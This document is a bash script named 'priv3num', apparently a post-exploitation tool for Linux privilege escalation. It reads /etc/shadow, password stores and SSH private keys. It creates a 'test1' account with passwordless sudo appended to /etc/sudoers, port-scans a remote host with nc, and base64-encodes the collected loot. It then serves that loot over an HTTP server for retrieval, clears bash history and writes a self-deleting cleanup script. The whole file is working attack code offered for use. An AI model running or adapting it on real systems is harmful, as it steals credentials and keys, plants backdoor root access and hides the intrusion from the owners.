#!/bin/bash
#This script will enumerate information used for privilege escalation
#Rename to priv3num
#chmod +x priv3num
#Usage:        	  ./priv3num <RHOST> <LPORT>


B='\033[0;96m' #${B}
G='\033[0;92m' #${G}
R='\033[0;91m' #${R}
N='\033[0m'    #${N}
cd /tmp/
printf "${B}\n------------------------------Start------------------------------\n\n${G}" | tee -a -i priv
date | tee -a -i priv
printf "${B}\n------------------------------IP------------------------------\n\n${G}" | tee -a -i priv
ip addr show | tee -a -i priv
printf "${B}\n------------------------------OS info------------------------------\n\n${G}" | tee -a -i priv
uname -a | tee -a -i priv
cat /etc/*-release | tee -a -i priv
cat /proc/version | tee -a -i priv
printf "${B}\n------------------------------Inside VM?------------------------------\n\n${G}" | tee -a -i priv
sudo dmidecode -s system-manufacturer | tee -a -i priv
sudo dmidecode | grep Product | tee -a -i priv
sudo dmesg | grep "Hypervisor detected" | tee -a -i priv
hostnamectl | tee -a -i priv
systemd-detect-virt | tee -a -i priv
printf "${B}\n------------------------------Bash version------------------------------\n\n${G}" | tee -a -i priv
bash --version | tee -a -i priv
printf "${B}\n------------------------------Sudo version------------------------------\n\n${G}" | tee -a -i priv
sudo -V	| tee -a -i priv
printf "${B}\n------------------------------User------------------------------\n\n${R}" | tee -a -i priv
whoami | tee -a -i priv
printf "${B}\n------------------------------Host------------------------------\n\n${R}" | tee -a -i priv
hostname | tee -a -i priv
dnsdomainname | tee -a -i priv
printf "${B}\n------------------------------ID------------------------------\n\n${G}" | tee -a -i priv
id | tee -a -i priv
printf "${B}\n------------------------------Sudo privileges------------------------------\n\n${R}" | tee -a -i priv
sudo -l | tee -a -i priv
printf "${B}\n------------------------------Path------------------------------\n\n${G}" | tee -a -i priv
echo $PATH | tee -a -i priv
printf "${B}\n------------------------------Directory------------------------------\n\n${R}" | tee -a -i priv
pwd | tee -a -i priv
ls | tee -a -i priv
printf "${B}\n------------------------------Dir file contents------------------------------\n\n${G}" | tee -a -i priv
ls -la /home/ | tee -a -i priv
printf "${B}\n------------------------------Root file contents------------------------------\n\n${G}" | tee -a -i priv
ls -la /root | tee -a -i priv
printf "${B}\n------------------------------Home file contents------------------------------\n\n${G}" | tee -a -i priv
ls -la /home/* | tee -a -i priv
printf "${B}\n------------------------------Processes running root------------------------------\n\n${G}" | tee -a -i priv
ps aux | grep root | tee -a -i priv
printf "${B}\n------------------------------Passwd------------------------------\n\n${R}" | tee -a -i priv
cat /etc/passwd | tee -a -i priv
printf "${B}\n------------------------------Old passwd------------------------------\n\n${R}" | tee -a -i priv
cat /etc/security/opasswd | tee -a -i priv
printf "${B}\n------------------------------Shadow------------------------------\n\n${R}" | tee -a -i priv
cat /etc/shadow | tee -a -i priv
printf "${B}\n------------------------------possbile passwd files------------------------------\n\n${R}" | tee -a -i priv
cat /var/apache2/config.inc | tee -a -i priv
cat /var/lib/mysql/mysql/user.MYD | tee -a -i priv
cat /root/anaconda-ks.cfg | tee -a -i priv
printf "${B}\n------------------------------writeable sudoers------------------------------\n\n${R}" | tee -a -i priv
adduser test1 | tee -a -i priv
echo "test1 ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers | tee -a -i priv
echo "test1 ALL=NOPASSWD: /bin/bash" >>/etc/sudoers | tee -a -i priv
cat /etc/sudoers | tee -a -i priv
printf "${B}\n------------------------------Crontabs------------------------------\n\n${R}" | tee -a -i priv
cat /etc/crontab | tee -a -i priv
crontab -l | tee -a -i priv
printf "${B}\n------------------------------Exports------------------------------\n\n${R}" | tee -a -i priv
cat /etc/exports | tee -a -i priv
printf "${B}\n------------------------------Hosts------------------------------\n\n${R}" | tee -a -i priv
cat /etc/hosts | tee -a -i priv
printf "${B}\n------------------------------SUID1------------------------------\n\n${R}" | tee -a -i priv
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------SUID2------------------------------\n\n${R}" | tee -a -i priv
find / -perm -u=s -type f 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Writable root files/folders------------------------------\n\n${R}" | tee -a -i priv
find / -writable -type d 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Find id_rsa------------------------------\n\n${R}" | tee -a -i priv
find / -name id_rsa 2>/dev/null | tee -a -i priv
printf "${B}\n------------------------------Root id_rsa------------------------------\n\n${R}" | tee -a -i priv
cat /root/.ssh/id_rsa | tee -a -i priv
printf "${B}\n------------------------------Root id_key------------------------------\n\n${R}" | tee -a -i priv
cat /root/.ssh/id_key | tee -a -i priv
printf "${B}\n------------------------------User id_rsa------------------------------\n\n${R}" | tee -a -i priv
cat ~/.ssh/id_rsa | tee -a -i priv
printf "${B}\n------------------------------User id_key------------------------------\n\n${R}" | tee -a -i priv
cat ~/.ssh/id_key | tee -a -i priv
printf "${B}\n------------------------------Open ports------------------------------\n\n${G}" | tee -a -i priv
nc -z -v $1 20-3389 2>&1 | grep succeeded | tee -a -i priv									#<RHOST>
printf "${B}\n------------------------------Bash history------------------------------\n\n${G}" | tee -a -i priv
cat ~/.*history | less | tee -a -i priv
printf "${B}\n------------------------------Finished------------------------------\n\n" | tee -a -i priv
clear
echo "#!/bin/bash" | tee -a -i webserver
echo "python3 -m http.server $2" | tee -a -i webserver											    #<LPORT>
base64 priv -w 0 | tee -a -i 2                                                 #Output file '2'
echo "#!/bin/bash" | tee -a -i cleanup
echo "rm -r 2" | tee -a -i cleanup
echo "rm -r priv3num" | tee -a -i cleanup
echo "rm -r priv" | tee -a -i cleanup
echo "rm -r webserver" | tee -a -i cleanup
echo "rm -r cleanup" | tee -a -i cleanup
#start reverse shell
chmod +x webserver
chmod +x cleanup
cat /dev/null > ~/.bash_history && history -c
./webserver
#run ./cleanup when finished
